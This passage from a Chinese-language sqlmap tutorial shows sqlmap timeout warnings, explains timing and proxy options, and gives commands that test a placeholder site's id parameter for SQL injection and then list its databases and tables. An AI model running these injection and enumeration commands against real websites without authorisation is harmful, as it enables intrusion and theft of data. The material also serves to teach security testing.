
`[16:02:31] WARNING：连接目标 URL 或代理超时；sqlmap 将重试请求`

`[16:02:32] WARNING：如果问题阻止了检查，请确认提供的目标 URL 是否有效。如果发生这种情况，请尝试开启 --random-agent 切换或切换代理 (--ignore-proxy) 后重试。`

如果你正在使用慢速连接或遇到远程数据库服务器响应缓慢的情况，可以在命令中添加 `--time-sec 10` 来引入更真实的超时设置。与直觉相反的是，这实际上可以加快整个过程。

现在有条理地执行几个简单命令。你可以选择使用 `sqlmap` 将这些所有命令链在一起。

我的 `sqlmap` 示例包含了 `-u` 选项，在声明 `URL` 时使用。该命令将通过多种 `SQL` 注入测试对尾随参数（`id=1111`）进行漏洞检查。在那里，`sqlmap` 通常可以检测到数据库服务器版本、远程操作系统以及正在使用的数据库服务器版本。

如果你想学习网络查询中使用的数据库名称怎么办？你可以通过如下添加 `--dbs` 选项来实现：

```
# sqlmap.py -u "http://www.a-vulnerable-website.com/php?id=1111" --dbs
```

在获取有用信息后，你的下一步是发现正在使用的表名。你可以通过将你的数据库名称替换为`<database-name>` 条目来实现：

```
# sqlmap.py -u "http://www.a-vulnerable-website.com/php?id=1111" --tables -D <database-name>
```
